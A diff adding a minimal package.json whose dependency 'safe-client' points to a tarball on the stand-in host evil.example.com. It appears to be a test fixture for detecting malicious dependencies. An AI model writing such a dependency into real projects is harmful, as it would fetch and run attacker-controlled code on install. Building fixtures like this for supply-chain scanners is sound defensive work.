@@ -1,0 +1,6 @@
+{
+  "name": "example",
+  "dependencies": {
+    "safe-client": "HTTPS://evil.example.com/malware.tgz"
+  }
+}
